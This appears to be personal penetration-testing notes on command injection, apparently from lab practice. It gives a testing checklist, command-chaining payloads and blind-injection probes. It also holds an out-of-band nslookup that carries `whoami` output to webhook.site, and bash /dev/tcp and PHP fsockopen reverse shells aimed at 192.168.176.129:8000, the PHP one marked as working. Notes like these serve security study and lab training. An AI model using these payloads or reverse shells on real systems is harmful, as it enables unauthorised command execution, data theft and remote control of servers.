* #commandInjection #reverseshell
*  https://appsecexplained.gitbook.io/appsecexplained/common-vulns/command-injection
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  
* Filter bypass [Payloads allthethings Filter bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection) 
## Testing
- Determine the technology stack: Which operating system and server software are in use?
- Identify potential injection points: URL parameters, form fields, HTTP headers, etc.
- Test for simple injections with special characters like ;, &&, ||, and |. Test for injection within command arguments.
- Test for blind command injection, where output is not returned in the response. If output isn't directly visible, try creating outbound requests (e.g. using ping or curl).
- Try to escape from any restriction mechanisms, like quotes or double quotes.
- Test with a list of potentially dangerous functions/methods (like exec(), system(), passthru() in PHP, or exec, eval in Node.js).
- Test for command injection using time delays (ping -c localhost).
- Test for command injection using &&, ||, and ;.
- Test with common command injection payloads, such as those from PayloadsAllTheThings.
- 
If there's a filter in place, try to bypass it using various techniques like encoding, command splitting, etc.
## Basic command chaining

```shell
; ls -la

# Using logic operators
&& ls -la

# Commenting out the rest of a command
; ls -la #

# Using a pipe for command chaining
| ls -la

# Testing for blind injection
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &

# Out-of-band testing
& nslookup webhook.site/<id>?`whoami` &
```

## Command Inject - BASH shell
* we can grab reverse shell from : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  
```shell
bash -i >& /dev/tcp/192.168.176.129/8000 0>&1  ## this didn't work
/bin/bash -i >& /dev/tcp/192.168.176.129/8000 0>&1  ## this didn't work

; which php; asdf
#  Result  /usr/local/bin/php 


# switching to php shell

php -r '$sock=fsockopen("192.168.176.129",8000);exec("/bin/sh -i <&3 >&3 2>&3");'
# SUCCESS!! This worked
```

